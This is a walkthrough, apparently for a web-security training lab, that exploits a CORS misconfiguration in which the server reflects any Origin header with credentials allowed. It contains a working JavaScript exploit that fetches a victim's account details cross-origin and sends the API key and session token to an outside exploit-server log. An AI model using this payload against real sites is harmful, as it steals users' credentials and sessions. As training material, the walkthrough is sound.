# Detailed Walkthrough

## Detect vulnerability

Log in using provided credentials and observe there’s a GET request to `/accountDetails` with the apiKey in response and header `Access-Control-Allow-Credentials: true` .

Change the Origin header to something like [`http://domain-not-exist.com`](http://domain-not-exist.com) and observe the server reflect this domain (it means it reflects any domain). This is the key issue (alongside with `Access-Control-Allow-Credentials: true`).

![image.png](Detailed%20Walkthrough/image.png)

## Exploit vulnerability

Click `Go to exploit server`.

Paste the exploit (replace `https://0a3300ab044333e78199577b00380003.web-security-academy.net` with Lab URL and `exploit-0a0100a804be3342815456fa01570052.exploit-server.net` with Exploit Server URL)

```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a3300ab044333e78199577b00380003.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='//exploit-0a0100a804be3342815456fa01570052.exploit-server.net/log?key='+this.responseText;
};
</script>
```

Click “Deliver exploit to victim”. Then click “Access log”.

Observe the log string like `10.0.3.81       2026-02-19 15:09:03 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22ru8zsx5lJkbRPjtVxNVX589chmZtlygj%22,%20%20%22sessions%22:%20[%20%20%20%20%22AZPngMztg2hFZT8E6AYeWpSOvsB3hqPf%22%20%20]} HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"` , you got the key.

Submit the key. See Lab solved.